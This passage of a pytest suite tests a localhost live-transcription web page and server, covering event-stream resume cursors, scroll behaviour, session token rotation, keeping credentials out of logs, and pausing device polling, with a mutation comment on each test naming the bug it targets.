    """FR-2.1 / NFR-5. Two requirements at once: the page must render with the
    network down, and it must not announce the operator's call to a third party by
    fetching a font."""
    # MUTATION: add `<link rel="stylesheet" href="https://cdn.../reset.css">`.
    external = [
        found
        for found in re.findall(r"https?://[^\s\"'<>)]+", page_source)
        if not found.startswith("http://127.0.0.1")
    ]
    assert external == [], f"the page references external assets: {external}"
    assert "//cdn." not in page_source and "@import" not in page_source


def test_the_page_opens_an_event_source_against_the_events_route(page_source):
    """FR-1.4. Without this the document renders and then sits there forever, which
    is indistinguishable from a stalled call."""
    # MUTATION: delete the `new EventSource(...)` construction.
    assert "EventSource" in page_source
    assert "/events" in page_source


def test_the_page_auto_scrolls_only_when_the_operator_is_already_at_the_bottom(page_source):
    """FR-2.2. Auto-scrolling away from where someone is reading is the failure this
    feature exists to prevent — the operator is mid-call and looking BACK.

    The GUARD is what is pinned, not the three property names. `scrollHeight`,
    `clientHeight` and `scrollTop` all still appear in a page that scrolls
    unconditionally — `atBottom()` can sit there computing a value nobody reads
    while `onTurn` jumps to the bottom on every line. Three `in page_source`
    checks are satisfied by exactly the version FR-2.2 forbids, so they pin
    nothing. What follows asserts that the only assignment to `scrollTop` in
    `onTurn` is inside the conditional, and that the condition is the at-bottom
    reading taken BEFORE the new row was appended (taking it after always reads
    "not at bottom", which silently disables following instead).
    """
    # MUTATION: `if (stick) { feed.scrollTop = feed.scrollHeight; }` ->
    # `feed.scrollTop = feed.scrollHeight;` at the end of `onTurn`.
    at_bottom = _js_function(page_source, "atBottom")
    for needed in ("scrollHeight", "clientHeight", "scrollTop"):
        assert needed in at_bottom, (
            f"the page cannot test for at-bottom without {needed}"
        )

    on_turn = _js_function(page_source, "onTurn")
    reading = re.search(r"var\s+(\w+)\s*=\s*atBottom\(\)\s*;", on_turn)
    assert reading, "onTurn never reads atBottom(), so it cannot be following"
    stick = reading.group(1)
    assert on_turn.index(reading.group(0)) < on_turn.index("feed.append("), (
        "the at-bottom reading is taken after the new row is appended, which "
        "always reads false and silently stops the feed following the call"
    )

    assignments = re.findall(r"\bscrollTop\s*=", on_turn)
    guarded = re.findall(
        r"if\s*\(\s*" + re.escape(stick) + r"\s*\)\s*\{[^{}]*?\bscrollTop\s*=", on_turn
    )
    assert len(assignments) == 1, (
        f"onTurn assigns scrollTop {len(assignments)} times; each one is an "
        "opportunity to scroll away from a reader"
    )
    assert len(guarded) == 1, (
        "onTurn scrolls the feed without the at-bottom guard, which yanks the "
        "transcript away from an operator who is reading back mid-call"
    )


def test_the_page_creates_a_speaker_row_from_the_turn_that_introduces_the_label(page_source):
    """FR-2.3, the client half. The server deliberately withholds the `names` push
    for the session's FIRST far label (`_note_label`), on the stated grounds that
    the turn which introduced it already carried it. That reasoning is only sound
    if the page registers the label from the turn itself.

    `test_a_speaker_row_appears_the_moment_its_first_turn_arrives` asserts on the
    SSE payloads and so cannot see this: with a single remote speaker the panel
    never receives a `names` event at all, and a page that only builds rows from
    `names` shows an empty panel for the whole call. That is the common 1:1 case,
    and it makes the one speaker on the call impossible to name.
    """
    # MUTATION: delete the label registration from `onTurn`, leaving it only in
    # `onRevision` — every test that reads the payload stream still passes.
    on_turn = _js_function(page_source, "onTurn")

    assert "labels" in on_turn, (
        "onTurn never touches the panel's label list, so the first speaker of a "
        "call gets no control-panel row and can never be named"
    )
    assert "paintPanel" in on_turn, (
        "onTurn registers a label without repainting the panel, so the new row "
        "does not appear until some later event happens to repaint"
    )


def test_the_page_derives_connection_status_from_the_event_source_not_from_traffic(
    page_source,
):
    """§5 matrix. Server alive with nobody speaking must read as connected, not as
    stalled — so status keys on the SSE connection lifecycle."""
    # MUTATION: delete the `onerror` handler, leaving a dropped connection to
    # render as a quiet call.
    assert re.search(r"onerror|addEventListener\(\s*['\"]error", page_source)
    assert re.search(r"onopen|addEventListener\(\s*['\"]open", page_source)


def test_the_page_carries_a_control_panel_input_per_speaker_label(page_source):
    """FR-2.3. The panel is in the same window — not a separate window, not a modal
    — and it is the only place a name can be typed."""
    # MUTATION: drop the panel and render the transcript alone.
    assert "<input" in page_source
    assert "/names" in page_source, "the panel has no write path back to the server"


def test_the_page_ships_no_custom_search_box(page_source):
    """FR-2.4. Find-in-page is the search feature and the reason a web surface was
    chosen at all; a half-built in-page filter competes with a better one."""
    # MUTATION: add a `<input type="search">` filter box in v1.
    assert 'type="search"' not in page_source and "type='search'" not in page_source


# ==========================================================================
# U-20 — elapsed_seconds is measured, not asserted
# ==========================================================================


def test_elapsed_seconds_is_measured_from_session_start(live):
    """§11. Elapsed-since-start is something this process genuinely measures. A
    wall-clock stamp would be a proxy for byte arrival dressed as a fact about when
    a person spoke — the `recorded_at` conflation that shipped wrong across 670
    transcripts."""
    # MUTATION: `time.monotonic() - self._started_at` -> `time.time()`; the value
    # becomes a Unix epoch and blows the upper bound.
    surface = live.surface()
    surface.publish(turn("first", order=0))
    surface.publish(turn("second", order=1))

    replayed = turns_of(live.page(surface).read(6))

    elapsed = [t["elapsed_seconds"] for t in replayed]
    assert all(isinstance(value, (int, float)) for value in elapsed)
    assert 0 <= elapsed[0] <= elapsed[1] < 30, f"not an elapsed measurement: {elapsed}"


def test_no_turn_field_asserts_a_wall_clock_time_of_speech(live):
    """§11's deliberately-absent row. If a wall-clock is ever wanted it must be
    named for what it is (`received_at`) and carry its invalidation condition —
    which is a decision, not something that arrives by accident."""
    # MUTATION: add `"spoken_at": time.time()` to the turn payload.
    surface = live.surface()
    surface.publish(turn("a line"))

    payload = turns_of(live.page(surface).read(4))[0]

    banned = {"spoken_at", "recorded_at", "timestamp", "time", "at", "wall_clock",
              "datetime", "started_at", "received_at"}
    assert not (banned & set(payload)), f"wall-clock field present: {banned & set(payload)}"


def test_the_module_reads_a_monotonic_clock_and_never_a_wall_clock():
    """Structural companion: the module must not be able to produce a wall-clock in
    the first place. A monotonic clock also cannot run backwards when the operator's
    machine syncs time mid-call."""
    # MUTATION: `import time` + `time.time()` anywhere in live_server.py.
    import hidock_direct.live_server as module

    tree = ast.parse(inspect.getsource(module))
    called = {
        ast.unparse(node.func)
        for node in ast.walk(tree)
        if isinstance(node, ast.Call)
    }
    for banned in ("time.time", "datetime.now", "datetime.utcnow", "datetime.today"):
        assert banned not in called, f"live_server calls {banned}()"
    assert "time.monotonic" in called, (
        "elapsed_seconds must come from a monotonic clock"
    )


# ==========================================================================
# U-15 / U-16 — subscribers and shutdown
# ==========================================================================


def test_the_events_route_is_a_server_sent_event_stream(live):
    """FR-1.4. `text/event-stream` is what makes `new EventSource(...)` work at all;
    served as `text/plain` the browser buffers and shows nothing."""
    # MUTATION: `send_header("Content-Type", "text/plain")` on the /events branch.
    surface = live.surface()

    assert "text/event-stream" in live.page(surface).content_type


def test_a_dropped_subscriber_does_not_stop_the_session_or_the_other_page(live):
    """FR-ERR-3 / §3.8. Closing the window is not a stop command — `l` is. A
    `BrokenPipeError` on one socket must drop that subscriber and nothing else."""
    # MUTATION: let BrokenPipeError propagate out of the broadcast loop (or catch
    # it and call `self.stop()`), so closing one window kills the session.
    surface = live.surface()
    watching = live.page(surface)
    closing = live.page(surface)
    watching.read(2)
    closing.read(2)

    closing.close()
    surface.publish(turn("spoken after the window closed", order=1))

    still_arriving = turns_of(watching.read(4))
    assert [t["text"] for t in still_arriving][-1:] == ["spoken after the window closed"]
    assert _get(_url(surface, "/health"))[0] == 200


def test_a_second_page_gets_the_full_backlog_while_the_first_stays_connected(live):
    """§6.2 'page reload mid-session' and 'window closed then reopened' both reduce
    to this: two subscribers, independent cursors, one shared ring."""
    # MUTATION: hold ONE subscriber (`self._subscriber = w`), so opening a second
    # window silently disconnects the first.
    surface = live.surface()
    surface.publish(turn("before anyone connected", order=0))
    first = live.page(surface)
    first.read(3)

    second = live.page(surface)
    replayed = second.read(4)

    assert [t["text"] for t in turns_of(replayed)] == ["before anyone connected"]
    surface.publish(turn("after the reload", order=1))
    assert [t["text"] for t in turns_of(first.read(2))][-1:] == ["after the reload"]


# ==========================================================================
# The resume path — `Last-Event-ID` (the ordinary case, not the rare one)
# ==========================================================================


def test_a_reconnect_with_last_event_id_replays_only_what_the_page_missed(live):
    """The idle recycle makes this the feature's ROUTINE path, not an edge case.

    `_STREAM_IDLE_SECONDS` drops any stream that has carried nothing but
    keep-alives, so a quiet call reconnects roughly every four seconds for its
    whole duration. Every one of those reconnects runs the resume filter, and the
    claim that "the reconnect costs nothing" rests entirely on it: without the
    filter each one replays the whole ring, and a page two hours into a call
    re-renders two hours of transcript every four seconds.
    """
    # MUTATION: `if last_event_id is not None and stored.emit_id <= last_event_id:`
    # -> `... stored.emit_id > last_event_id:` in `LiveSurface.attach` (the
    # comparison inverts: the page is replayed exactly what it already had, and
    # never the line it missed).
    surface = live.surface()
    surface.publish(turn("said before the drop", label="A", order=0))

    watching = live.page(surface)
    assert [t["text"] for t in turns_of(watching.read(3))] == ["said before the drop"]
    cursor = watching.last_event_id
    assert cursor is not None, "the stream carried no `id:` line to resume from"
    watching.close()

    # The window is gone for a moment — a recycled idle stream, a closed lid, a
    # browser tab the operator switched away from. The call keeps going.
    surface.publish(turn("said during the gap", label="A", order=1))

    resumed = live.page(surface, last_event_id=cursor)
    replayed = resumed.read(4)

    assert [t["text"] for t in turns_of(replayed)] == ["said during the gap"], (
        "the resume replayed the wrong side of the cursor"
    )


def test_a_reconnect_whose_cursor_is_current_is_replayed_nothing(live):
    """The other end of the same filter: a stream recycled during a quiet stretch
    reconnects with a cursor that is already up to date, and must be handed the
    session's status and names — but not one turn it is already showing."""
    # MUTATION: drop the `last_event_id is not None` condition guarding the skip,
    # or compare with `<` instead of `<=` (the turn AT the cursor is then resent).
    surface = live.surface()
    surface.publish(turn("the only line so far", label="A", order=0))
    watching = live.page(surface)
    watching.read(3)
    cursor = watching.last_event_id
    watching.close()

    resumed = live.page(surface, last_event_id=cursor)
    replayed = resumed.read(4)

    assert turns_of(replayed) == [], f"a current page was replayed {replayed}"
    assert kinds(replayed, "status") and kinds(replayed, "names"), (
        "a resumed stream must still be told the session is live and who is on it"
    )


def test_one_pages_catch_up_does_not_move_another_pages_resume_cursor(live):
    """`emit_id` records where a turn sits in the SHARED stream, so only a
    broadcast may write it.

    Two windows onto one call is the ordinary setup, not an exotic one — the
    operator opens a second one on the other screen, or reloads and leaves the
    first tab alive for a moment. When the second window connects it is replayed
    the whole ring through the single-page path. If that replay stamped each
    turn's `emit_id` with the id it was handed to THAT page, every already-open
    page's `Last-Event-ID` would land below the entire ring, and its next
    reconnect would replay the whole scrollback instead of the one line it
    missed. `_STREAM_IDLE_SECONDS` recycles every idle stream about every four
    seconds, so on a quiet call that is not a rare cost — it is a full
    re-render, continuously, for as long as two windows are open.
    """
    # MUTATION: `self._send(subscriber, self._turn_payload(stored))` ->
    # `self._broadcast(self._turn_payload(stored), stored)` in `LiveSurface
    # .attach` — the shape the `stored` parameter used to make available on the
    # single-page path. The `attach` half still looks right; the ALREADY-OPEN
    # page's cursor is what goes wrong, which is why the assertion is on the
    # resume and not on the catch-up.
    surface = live.surface()
    surface.publish(turn("one", label="A", order=0))
    surface.publish(turn("two", label="A", order=1))

    watching = live.page(surface)
    assert [t["text"] for t in turns_of(watching.read(4))] == ["one", "two"]
    cursor = watching.last_event_id
    assert cursor is not None, "the stream carried no `id:` line to resume from"

    # A second window opens and is caught up on everything said so far.
    catching_up = live.page(surface)
    assert [t["text"] for t in turns_of(catching_up.read(4))] == ["one", "two"], (
        "the second window was not replayed the call it joined"
    )

    # Now the FIRST window's stream is recycled and it reconnects with the
    # cursor it held before the second window ever appeared.
    watching.close()
    surface.publish(turn("three", label="A", order=2))

    resumed = live.page(surface, last_event_id=cursor)

    assert [t["text"] for t in turns_of(resumed.read(3))] == ["three"], (
        "another page's catch-up rewrote the shared cursor, so this page was "
        "replayed lines it was already showing"
    )


def test_a_first_connection_and_an_unreadable_cursor_both_get_the_whole_ring(live):
    """No `Last-Event-ID` at all is a first connection, and a malformed one is a
    client this server cannot reason about — both must render the scrollback
    rather than an empty transcript, which is indistinguishable from a dead call.
    """
    # MUTATION: `except ValueError: return None` -> `except ValueError: return 0`
    # in `_last_event_id`.
    #
    # That mutation is killed by the LAST assertion in this test and by nothing
    # else, which is why the assertion is here. `0` is a real cursor rather than
    # "no cursor", but the ring's own ids start at 1 (`_seq` is pre-incremented
    # before every send), so a `0` cursor filters nothing and the difference is
    # invisible through the stream — it stays invisible right up until the
    # default moves to `-1`, or to a `raise`, and a garbled header costs the
    # operator their whole transcript. The behavioural half below cannot see
    # that; the return value is where the contract actually lives, so that is
    # what is pinned.
    surface = live.surface()
    surface.publish(turn("first", label="A", order=0))
    surface.publish(turn("second", label="A", order=1))

    fresh = live.page(surface)
    assert [t["text"] for t in turns_of(fresh.read(4))] == ["first", "second"]

    garbled = Page(surface, last_event_id="not-a-number")
    try:
        assert [t["text"] for t in turns_of(garbled.read(4))] == ["first", "second"], (
            "a malformed resume cursor cost the operator their scrollback"
        )
    finally:
        garbled.close()

    # A cursor this server cannot read is the SAME answer as no cursor at all,
    # and it is not any particular number.
    assert live_server_module._last_event_id("not-a-number") is None
    assert live_server_module._last_event_id(None) is None
    assert live_server_module._last_event_id("") is None
    # ...and a cursor it CAN read is still read, so the guard above is not
    # swallowing every header.
    assert live_server_module._last_event_id("7") == 7


def test_stop_shuts_the_server_down_even_with_a_page_still_open(live):
    """FR-1.6. A stale server serving a finished call's transcript is a disclosure
    surface with no owner. Run under a deadline because the realistic failure is a
    HANG — a non-daemon SSE handler thread that `shutdown()` waits on forever."""
    # MUTATION: `daemon_threads = True` -> `False` on the ThreadingHTTPServer
    # subclass (the deadline fires). Or: `stop()` returns without calling
    # `shutdown()`/`server_close()` (the request below still succeeds).
    surface = live.surface()
    page = live.page(surface)
    page.read(2)
    url = _url(surface, "/health")

    finished = threading.Event()
    threading.Thread(
        target=lambda: (surface.stop(), finished.set()), daemon=True
    ).start()
    assert finished.wait(3.0), "stop() did not return; the server thread was joined"

    with pytest.raises((urllib.error.URLError, ConnectionError, OSError)):
        _get(url, timeout=1.0)


def test_stop_is_idempotent_and_leaves_the_surface_restartable(live):
    """It runs from the controller's `finally`, alongside `resume_polling` — so it
    must not raise. But "did not raise" is not an assertion: a `stop()` that
    returned immediately without doing anything satisfies it perfectly, while
    leaving a server still serving a finished call's transcript.

    So the idempotency asserted here is OBSERVABLE on both sides of the second
    call: the first stop actually stops, the second changes nothing, and what the
    pair leaves behind is a surface that can be started again — which is the state
    the controller's stop/start cycle depends on.
    """
    # MUTATION: `if not self._running: return` -> `if self._running: return` at the
    # top of `LiveSurface.stop`. The first stop then no-ops, the server keeps
    # serving, and nothing raises anywhere.
    surface = live.surface()
    port = surface.port
    live.page(surface).read(1)

    surface.stop()

    assert surface.running is False
    assert surface.port == 0, "stop() left a bound server behind"
    with pytest.raises((urllib.error.URLError, ConnectionError, OSError)):
        _get(f"http://127.0.0.1:{port}/health", timeout=1.0)

    surface.stop()  # the second one: same state, no exception

    assert surface.running is False
    assert surface.port == 0
    surface.start()
    assert surface.running is True
    assert _get(_url(surface, "/health"))[0] == 200, (
        "a doubled stop left the surface unable to bind again"
    )


def test_stopping_invalidates_the_token_rather_than_only_closing_the_socket(live):
    """FR-1.6 names three things: the thread stops, the ring is dropped, the token
    is invalidated. A token that survives is a credential outliving its session."""
    # MUTATION: `self._token = secrets.token_urlsafe(32)` ->
    # `self._token = self._token or secrets.token_urlsafe(32)` in
    # `LiveSurface.start` — the next session then inherits the finished one's
    # credential, which is a token for a transcript nobody owns.
    surface = live.surface()
    old_token = surface.token
    old_ticket = surface.mint_ticket(300.0)
    surface.publish(turn(SECRET_TEXT))
    surface.stop()

    surface.start()

    assert surface.token != old_token, "the finished session's token still works"
    assert _get(_url(surface, "/"), cookie=_session_cookie(surface, old_token))[0] == 403
    # Deliberately not carrying its own MUTATION claim: the ticket table is
    # cleared by BOTH `stop()` and `start()`'s reset, and `redeem_ticket` refuses
    # outright while `_running` is False. Three independent guards mean no single
    # line can be changed to make this fail — which is the point of asserting it,
    # not a reason to leave it unasserted.
    assert _get(_ticket_url(surface, old_ticket))[0] == 403, (
        "a ticket minted for the finished session still opens the new one's page"
    )
    assert turns_of(live.page(surface).read(2)) == [], "the ring survived the stop"


def test_each_session_mints_its_own_unguessable_token(live):
    """FR-1.3 — `secrets.token_urlsafe(32)`. A fixed or short token makes the
    guessable-localhost-port attack in §8 work again."""
    # MUTATION: `secrets.token_urlsafe(32)` -> `secrets.token_urlsafe(4)`, or a
    # module-level constant token shared by every session.
    first = live.surface()
    second = live.surface()

    assert first.token != second.token
    for token in (first.token, second.token):
        assert len(token) >= 43, f"token is only {len(token)} chars; 32 bytes is 43"
        assert re.fullmatch(r"[A-Za-z0-9_-]+", token)


# ==========================================================================
# U-17 / NFR-4 — nothing secret reaches a log
# ==========================================================================


def test_no_log_record_carries_transcript_text_the_token_or_audio_bytes(live, caplog):
    """NFR-4, extended from 1a/1b: the token is a credential for this session's
    transcript, so it joins transcript text and audio in the never-logged set."""
    # MUTATION: `log.info("live: turn %s", payload)` in the broadcast path, or
    # `log.info("live surface at %s", self.url)` (the URL carries the token).
    caplog.set_level(logging.DEBUG)
    surface = live.surface(operator_name="Blake")
    surface.publish(turn(SECRET_TEXT, label="A"))
    surface.publish(near(SECRET_TEXT))
    page = live.page(surface)
    page.read(4)
    _post_as_page(surface, {"label": "A", "name": "Dana"})
    _post(
        _url(surface, "/names"),
        {"label": "A", "name": "Mallory"},
        cookie=_session_cookie(surface, "wrong"),
    )
    surface.stop()

    blob = "\n".join(record.getMessage() for record in caplog.records)
    assert SECRET_TEXT not in blob
    assert surface.token not in blob
    assert "\\x" not in blob and "b'" not in blob


def test_the_http_access_log_does_not_print_a_credential_to_stderr(live, capfd):
    """The default `BaseHTTPRequestHandler.log_message` writes the full request
    line to stderr — which is `GET /?k=<ticket> HTTP/1.1`. It must be overridden,
    and no unit test of `publish()` would ever notice.

    Both credentials are checked. The token no longer has a URL form, so it can
    only reach the access log through the `Cookie` header; the ticket does ride in
    the request line, which is the surface that made this test necessary in the
    first place.
    """
    # MUTATION: delete the `log_message` override on the handler class.
    surface = live.surface()
    ticket = surface.mint_ticket(300.0)
    _get(_ticket_url(surface, ticket))
    _get_as_page(surface, "/")
    _get(_url(surface, "/events"), timeout=0.5, cookie=_session_cookie(surface))

    captured = capfd.readouterr()
    stream = captured.out + captured.err
    assert surface.token not in stream
    assert ticket not in stream


def test_the_surface_writes_no_file_anywhere(tmp_path, monkeypatch, live):
    """NFR-6. The 48 kHz recording and the offline pipeline stay authoritative;
    nothing here touches the archive or the ledger."""
    # MUTATION: persist the ring to a scratch file on stop ("so a crash keeps the
    # transcript"), which is precisely the archive-adjacent write NFR-6 forbids.
    monkeypatch.chdir(tmp_path)
    surface = live.surface()
    surface.publish(turn(SECRET_TEXT))
    live.page(surface).read(3)
    surface.stop()

    assert list(tmp_path.iterdir()) == []


# ==========================================================================
# §6.2 — the response-variant matrix
# ==========================================================================


def test_variant_near_partial_is_rendered_marked_non_final_and_named(live):
    """Row 1. A partial that renders identically to a final reads as a finished
    sentence the operator can act on, which is exactly when it changes."""
    # MUTATION: `"is_final": True` hardcoded in the payload builder.
    surface = live.surface(operator_name="Blake")
    surface.publish(near("yeah one sec", order=13, final=False))

    payload = turns_of(live.page(surface).read(4))[0]

    assert payload["text"] == "yeah one sec"
    assert payload["is_final"] is False
    assert payload["display_name"] == "Blake"


def test_variant_a_final_turn_replaces_its_partial_rather_than_appending(live):
    """Row 2. Keyed on (channel, turn_order) because the two sessions number their
    turns independently — a near turn 3 and a far turn 3 are different turns."""
    # MUTATION: key the ring's replacement on `turn_order` alone; the far line then
    # overwrites the near one and the backlog holds a single turn.
    surface = live.surface(operator_name="Blake")
    surface.publish(near("yeah one", order=3, final=False))
    surface.publish(near("yeah one second", order=3, final=True))
    surface.publish(turn("and their reply", label="A", order=3, final=True))

    replayed = turns_of(live.page(surface).read(6))

    assert [(t["channel"], t["text"]) for t in replayed] == [
        ("near", "yeah one second"),
        ("far", "and their reply"),
    ]
    assert all(t["is_final"] for t in replayed)


def test_variant_a_live_page_still_sees_both_the_partial_and_the_final(live):
    """The ring collapses them; the STREAM must not, or the page has nothing to
    show between the start of a sentence and its end."""
    # MUTATION: broadcast only finals (`if not event.is_final: return`), which
    # makes the whole live surface lag a full turn behind the conversation.
    surface = live.surface()
    page = live.page(surface)
    page.read(2)

    surface.publish(turn("partial thought", order=4, final=False))
    surface.publish(turn("partial thought complete", order=4, final=True))

    streamed = turns_of(page.read(2))
    assert [t["is_final"] for t in streamed] == [False, True]


def test_variant_a_far_turn_with_no_label_renders_without_an_attribution(live):
    """Row 5. Never blank-NAMED: the line is attributed to nobody, which is honest,
    rather than to an empty string, which looks like a rendering fault."""
    # MUTATION: `display_name = self._display(label)` with no None branch, yielding
    # "Speaker None" for an unlabelled far turn.
    surface = live.surface()
    surface.publish(turn("someone said this", label=None, order=0))

    payload = turns_of(live.page(surface).read(4))[0]

    assert payload["text"] == "someone said this"
    assert payload["label"] is None
    assert payload["display_name"] is None


def test_variant_an_empty_turn_never_reaches_the_page(live):
    """Row 9. A silent turn boundary is not something to show; a blank row in the
    scrollback is indistinguishable from a dropped line."""
    # MUTATION: drop the `if not event.text.strip(): return` guard in publish().
    surface = live.surface()
    surface.publish(turn("", order=0))
    surface.publish(turn("   ", order=1))
    surface.publish(turn("real content", order=2))

    replayed = turns_of(live.page(surface).read(4))

    assert [t["text"] for t in replayed] == ["real content"]


def test_variant_stopped_clears_the_indicator_shows_billed_seconds_and_keeps_the_text(
    live,
):
    """Row 7 / §5 matrix. The stream stops; the transcript does not vanish — the
    operator is still reading it, and it is the only copy of a live session."""
    # MUTATION: clear the ring when LiveTranscriptionStopped arrives ("the session
    # is over"), which wipes the transcript out from under the operator.
    # MUTATION: delete `self._session_live = False` from `_on_stopped`. The
    # broadcast asserted first is NOT affected by it — its `"live": False` is a
    # literal written in that same method — so the only reader that can tell is
    # `_status_payload()`, which is what a page connecting AFTER the call ended
    # receives. §5's matrix names session stop as this indicator's clear path and
    # FR-2.5/§8 make the indicator a security control: a window opened onto a
    # finished call must not show a lit LIVE over a device nobody is streaming.
    surface = live.surface()
    surface.publish(turn("said during the call", order=0))
    page = live.page(surface)
    page.read(3)

    surface.publish(
        LiveTranscriptionStopped(near_seconds=612.0, far_seconds=598.0, reason="stopped")
    )

    status = kinds(page.read(2), "status")[-1]
    assert status["live"] is False
    assert status["near_seconds"] == 612.0 and status["far_seconds"] == 598.0

    # A window opened after the call ended: same transcript, and an indicator
    # that reports the SURFACE's state rather than a literal from the stop path.
    opened_afterwards = live.page(surface).read(3)
    assert [t["text"] for t in turns_of(opened_afterwards)] == ["said during the call"]
    fresh_status = kinds(opened_afterwards, "status")
    assert fresh_status, "a newly connected page was never told the session state"
    assert fresh_status[0]["live"] is False, (
        "a page connecting after the session stopped was handed a lit LIVE "
        "indicator; the stop path broadcast a literal and cleared nothing"
    )


def test_variant_unknown_billed_seconds_are_reported_as_unknown_not_zero(live):
    """Inherited from 1b: `audio_duration_seconds` is Optional upstream, and a
    metered feature reporting 0 when it does not know understates a real bill."""
    # MUTATION: `float(event.near_seconds or 0)` in the status payload builder.
    surface = live.surface()
    page = live.page(surface)
    page.read(2)

    surface.publish(
        LiveTranscriptionStopped(near_seconds=None, far_seconds=None, reason="stopped")
    )

    status = kinds(page.read(2), "status")[-1]
    assert status["near_seconds"] is None and status["far_seconds"] is None


def test_variant_a_bridge_error_reaches_the_surface_as_operator_actionable_text(live):
    """Row 8 / FR-ERR-4. The bridge already distinguishes a bad key from a dead
    balance; that distinction is worthless if it never leaves the TUI."""
    # MUTATION: drop the Error branch from publish(), so a failed session shows a
    # cleared indicator and no reason.
    surface = live.surface()
    page = live.page(surface)
    page.read(2)

    surface.publish(
        Error(
            message="Live transcription stopped on the far channel — top up your balance",
            severity=Severity.ERROR,
            context="live",
        )
    )

    errors = kinds(page.read(2), "error")
    assert errors and "top up your balance" in errors[0]["message"]


def test_the_surface_forwards_only_live_errors_not_the_offload_workers(live):
    """The surface subscribes to the whole bus. Without a context filter, a USB
    replug notice lands in the middle of a live transcript."""
    # MUTATION: forward every Error regardless of `context`.
    surface = live.surface()
    page = live.page(surface)
    page.read(2)

    surface.publish(Error(message="Transfer aborted: cable", severity=Severity.WARNING,
                          context="worker_loop"))
    surface.publish(Error(message="live bridge died", severity=Severity.ERROR,
                          context="live"))

    forwarded = [e["message"] for e in kinds(page.read(2), "error")]
    assert forwarded == ["live bridge died"]


def test_offload_events_on_the_shared_bus_are_ignored(live):
    """Same reason, for the non-Error traffic: the bus carries the whole offload
    pipeline, and none of it belongs in a call transcript."""
    # MUTATION: broadcast every event the surface receives.
    surface = live.surface()
    page = live.page(surface)
    page.read(2)

    surface.publish(
        DownloadComplete(device_filename="Rec30.hda", archive_path="/a/b.wav", sha256="ab" * 32)
    )
    surface.publish(turn("the only line that belongs here", order=0))

    streamed = page.read(2)
    assert [t["text"] for t in turns_of(streamed)] == ["the only line that belongs here"]
    assert len(streamed) == 1, f"non-live traffic was forwarded: {streamed}"


def test_variant_page_reload_mid_session_returns_backlog_names_and_a_lit_indicator(live):
    """Row 10. All three at once, because a reload that returns two of the three is
    the version that ships."""
    # MUTATION: send the connect-time status as `{"live": self._saw_a_turn}`,
    # so a reload during a quiet stretch reads as a dead session.
    surface = live.surface(operator_name="Blake")
    surface.publish(turn("earlier line", label="A", order=0))
    surface.set_name("A", "Dana")
    first = live.page(surface)
    first.read(4)
    first.close()

    reloaded = live.page(surface).read(4)

    assert kinds(reloaded, "status")[0]["live"] is True
    assert kinds(reloaded, "names")[0]["names"] == {"A": "Dana"}
    assert [t["display_name"] for t in turns_of(reloaded)] == ["Dana"]


def test_the_indicator_tracks_the_session_and_not_traffic(live):
    """§5 matrix steady-state walk. A quiet call emits no turns for minutes; an
    indicator wired to turn arrival would clear itself and tell the operator audio
    had stopped leaving the machine while it was still leaving."""
    # MUTATION: emit `{"kind":"status","live":false}` on an idle timer.
    surface = live.surface()
    page = live.page(surface, timeout=0.8)
    assert kinds(page.read(2), "status")[0]["live"] is True

    quiet = page.drain(timeout=1.2)

    assert [s for s in kinds(quiet, "status") if s.get("live") is False] == []
    surface.publish(turn("finally someone spoke"))
    assert turns_of(page.read(1))[0]["text"] == "finally someone spoke"


def test_the_bridges_started_event_does_not_reset_the_surface(live):
    """§5 matrix: the indicator's set path is SESSION start, which is the surface's
    own lifetime. The bridge's `LiveTranscriptionStarted` arrives after the page may
    already be open — and on a reconnect it can arrive twice."""
    # MUTATION: handle LiveTranscriptionStarted by clearing the ring and the label
    # set ("a new session is beginning"), which wipes turns the operator is reading.
    surface = live.surface()
    surface.publish(turn("before the bridge reported ready", label="A", order=0))

    surface.publish(LiveTranscriptionStarted(channels=("near", "far")))

    payloads = live.page(surface).read(4)
    assert [t["text"] for t in turns_of(payloads)] == ["before the bridge reported ready"]
    assert kinds(payloads, "status")[0]["live"] is True


def test_a_speaker_row_appears_the_moment_its_first_turn_arrives(live):
    """FR-2.3 / §5 matrix. The panel exists so the operator can name someone WHILE
    they are talking; a row that waits for a name is a row nobody can create."""
    # MUTATION: build `labels` from `self._names.keys()`, so a label with no name
    # never gets a row and can never be named.
    surface = live.surface()
    page = live.page(surface)
    page.read(2)

    surface.publish(turn("first speaker", label="A", order=0))
    surface.publish(turn("second speaker", label="B", order=1))

    labels = kinds(page.read(4), "names")[-1]["labels"]
    assert labels == ["A", "B"]


def test_a_speaker_row_survives_its_turns_being_evicted_from_the_ring(live):
    """§5 matrix: labels accumulate within a session and are never cleared, because
    a speaker who stopped talking is still on the call. Deriving them from the ring
    silently retires people from the panel on a long call."""
    # MUTATION: `labels = sorted({t.label for t in self._ring if t.label})`.
    surface = live.surface(ring_size=2)
    surface.publish(turn("said once, long ago", label="A", order=0))
    surface.publish(turn("later", label="B", order=1))
    surface.publish(turn("later still", label="B", order=2))

    payloads = live.page(surface).read(6)

    assert [t["label"] for t in turns_of(payloads)] == ["B", "B"], "ring did not evict"
    assert kinds(payloads, "names")[0]["labels"] == ["A", "B"]


# ==========================================================================
# U-11 / U-12 / FR-6.x — device mutual exclusion
# ==========================================================================


def test_starting_a_live_session_suspends_offload_polling(controller):
    """FR-6.1. `App._worker_loop` polls `get_file_count()` and `RealtimeSession`
    issues CMD 33/34 through the same Jensen endpoint; two threads issuing commands
    concurrently interleave request/response pairs."""
    # MUTATION: delete the `self._suspend()` call from start().
    harness = controller()

    harness.controller.start()

    assert harness.suspends == 1
    assert harness.resumes == 0
    assert harness.controller.is_live is True


def test_stopping_a_live_session_resumes_offload_polling(controller):
    """FR-6.1's other half. A permanently suspended worker silently stops
    offloading — a failure whose only symptom is the absence of something."""
    # MUTATION: delete the `self._resume()` call from the teardown path.
    harness = controller()
    harness.controller.start()

    harness.controller.stop()

    assert harness.resumes == 1
    assert harness.controller.is_live is False
    assert harness.surface.stopped >= 1


def test_the_surface_is_bound_before_polling_is_suspended(controller):
    """FR-ERR-1 ordering, stated as a positive: suspension is only ever taken once
    the session is certain to start, so a bind failure cannot strand the worker.

    The ORDER is the requirement and it is the whole requirement. Asserting only
    that the surface started leaves the two statements free to appear in either
    order — that assertion holds identically under the mutation it is named for,
    so it pins nothing. `test_a_port_bind_failure_refuses_the_session_and_never
    _suspends_polling` covers the negative case; this covers the ordering itself,
    so a reordering that still happens to leave the bind-failure path correct is
    caught here rather than nowhere.
    """
    # MUTATION: move `self._suspend()` above `surface.start()` in
    # `LiveSessionController.start` (the timeline then reads suspend-first).
    harness = controller()

    harness.controller.start()

    assert harness.surface.started == 1
    assert harness.suspends == 1
